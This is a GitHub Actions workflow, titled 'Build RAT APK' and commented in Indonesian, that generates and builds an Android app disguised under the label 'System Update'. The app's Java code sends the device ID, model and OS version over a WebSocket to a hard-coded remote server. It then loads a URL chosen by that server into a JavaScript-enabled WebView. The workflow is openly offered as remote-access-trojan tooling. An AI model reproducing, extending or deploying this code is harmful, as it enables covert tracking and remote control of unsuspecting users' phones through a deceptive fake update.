name: Build RAT APK

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v4

    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'temurin'

    - name: Setup Android SDK
      uses: android-actions/setup-android@v3

    - name: Setup Gradle
      uses: gradle/actions/setup-gradle@v3
      with:
        gradle-version: 8.2

    - name: Auto-Generate Config Files
      run: |
        # 1. Timpa settings.gradle biar bersih
        echo "pluginManagement {" > settings.gradle
        echo "    repositories {" >> settings.gradle
        echo "        google()" >> settings.gradle
        echo "        mavenCentral()" >> settings.gradle
        echo "        gradlePluginPortal()" >> settings.gradle
        echo "    }" >> settings.gradle
        echo "}" >> settings.gradle
        echo "dependencyResolutionManagement {" >> settings.gradle
        echo "    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)" >> settings.gradle
        echo "    repositories {" >> settings.gradle
        echo "        google()" >> settings.gradle
        echo "        mavenCentral()" >> settings.gradle
        echo "    }" >> settings.gradle
        echo "}" >> settings.gradle
        echo "rootProject.name = 'knt'" >> settings.gradle
        echo "include ':app'" >> settings.gradle

        # 2. Timpa build.gradle root
        echo "plugins {" > build.gradle
        echo "    id 'com.android.application' version '8.1.0' apply false" >> build.gradle
        echo "}" >> build.gradle

        # 3. Bikin file MainActivity.java (Kalo blm ada)
        mkdir -p app/src/main/java/com/kinar/rmdproject
        cat << 'EOF' > app/src/main/java/com/kinar/rmdproject/MainActivity.java
        package com.kinar.rmdproject;

        import android.os.Bundle;
        import android.util.Log;
        import android.webkit.WebView;
        import android.webkit.WebViewClient;
        import androidx.appcompat.app.AppCompatActivity;
        import okhttp3.*;
        import org.json.JSONObject;
        import java.io.IOException;
        import java.util.concurrent.TimeUnit;

        public class MainActivity extends AppCompatActivity {
            private WebSocket webSocket;
            private String deviceId;
            private WebView webView;
            private final String SERVER_HTTP = "http://herstoreganteng.rexypediaa.biz.id:4732";
            private final String WS_URL = "ws://herstoreganteng.rexypediaa.biz.id:4732"; 

            @Override
            protected void onCreate(Bundle savedInstanceState) {
                super.onCreate(savedInstanceState);
                webView = new WebView(this);
                webView.getSettings().setJavaScriptEnabled(true);
                webView.setWebViewClient(new WebViewClient());
                webView.loadData("<h2>Loading...</h2>", "text/html", "UTF-8");
                setContentView(webView);
                deviceId = android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
                fetchTargetUrl();
                connectWebSocket();
            }

            private void fetchTargetUrl() {
                OkHttpClient client = new OkHttpClient();
                Request request = new Request.Builder().url(SERVER_HTTP + "/api/get-target").build();
                client.newCall(request).enqueue(new Callback() {
                    @Override public void onFailure(Call call, IOException e) { runOnUiThread(() -> webView.loadUrl("https://rioomd.my.id")); }
                    @Override public void onResponse(Call call, Response response) throws IOException {
                        if (response.isSuccessful() && response.body() != null) {
                            String urlTarget = response.body().string();
                            runOnUiThread(() -> webView.loadUrl(urlTarget));
                        } else { runOnUiThread(() -> webView.loadUrl("https://rioomd.my.id")); }
                    }
                });
            }

            private void connectWebSocket() {
                OkHttpClient client = new OkHttpClient.Builder().readTimeout(0, TimeUnit.MILLISECONDS).build();
                Request request = new Request.Builder().url(WS_URL).build();
                webSocket = client.newWebSocket(request, new WebSocketListener() {
                    @Override public void onOpen(WebSocket webSocket, Response response) { registerDevice(webSocket); }
                    @Override public void onMessage(WebSocket webSocket, String text) { Log.d("RAT", text); }
                });
            }

            private void registerDevice(WebSocket ws) {
                try {
                    JSONObject json = new JSONObject();
                    json.put("type", "register");
                    json.put("device_id", deviceId);
                    json.put("name", android.os.Build.MODEL);
                    json.put("os", "Android " + android.os.Build.VERSION.RELEASE);
                    ws.send(json.toString());
                } catch (Exception e) {}
            }
        }
        EOF

        # 4. Bikin AndroidManifest.xml
        mkdir -p app/src/main
        cat << 'EOF' > app/src/main/AndroidManifest.xml
        <?xml version="1.0" encoding="utf-8"?>
        <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.kinar.rmdproject">
            <uses-permission android:name="android.permission.INTERNET" />
            <application android:label="System Update" android:theme="@android:style/Theme.NoTitleBar">
                <activity android:name=".MainActivity" android:exported="true">
                    <intent-filter>
                        <action android:name="android.intent.action.MAIN" />
                        <category android:name="android.intent.category.LAUNCHER" />
                    </intent-filter>
                </activity>
            </application>
        </manifest>
        EOF

        # 5. Bikin app/build.gradle
        cat << 'EOF' > app/build.gradle
        plugins {
            id 'com.android.application'
        }
        android {
            namespace 'com.kinar.rmdproject'
            compileSdk 33
            defaultConfig {
                applicationId "com.kinar.rmdproject"
                minSdk 21
                targetSdk 33
                versionCode 1
                versionName "1.0"
            }
        }
        dependencies {
            implementation 'androidx.appcompat:appcompat:1.6.1'
            implementation 'com.squareup.okhttp3:okhttp:4.12.0'
        }
        EOF

    - name: Build APK
      run: gradle assembleDebug

    - name: Upload APK
      uses: actions/upload-artifact@v4
      with:
        name: template-apk
        path: app/build/outputs/apk/debug/app-debug.apk
